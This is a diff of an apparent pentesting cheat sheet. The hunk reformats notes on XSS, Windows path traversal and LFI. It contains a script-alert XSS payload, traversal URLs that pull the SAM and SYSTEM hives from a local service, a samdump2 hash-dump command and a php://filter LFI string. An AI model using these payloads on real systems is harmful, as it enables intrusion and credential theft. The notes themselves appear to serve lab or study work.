@@ -46,12 +46,13 @@ url#<script>alert("hi");</script>
 [This post is super helpful](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 
 - Windows file travesal to shell:
-        ~~~
-        http://127.0.0.1:8880/calc.efff?../../../../windows/repair/SAM
-        http://127.0.0.1:8880/calc.efff?../../../../windows/repair/SYSTEM
 
-        samdump2 SYSTEM SAM > hashes.txt
-        ~~~
+~~~
+http://127.0.0.1:8880/calc.efff?../../../../windows/repair/SAM
+http://127.0.0.1:8880/calc.efff?../../../../windows/repair/SYSTEM
+
+samdump2 SYSTEM SAM > hashes.txt
+~~~
 - LFI
     `php://filter/convert.base64-encode/resource=index`
     + perl server would eval any .cgi file(perl code inside), if the perl server ran as root then you have it already!
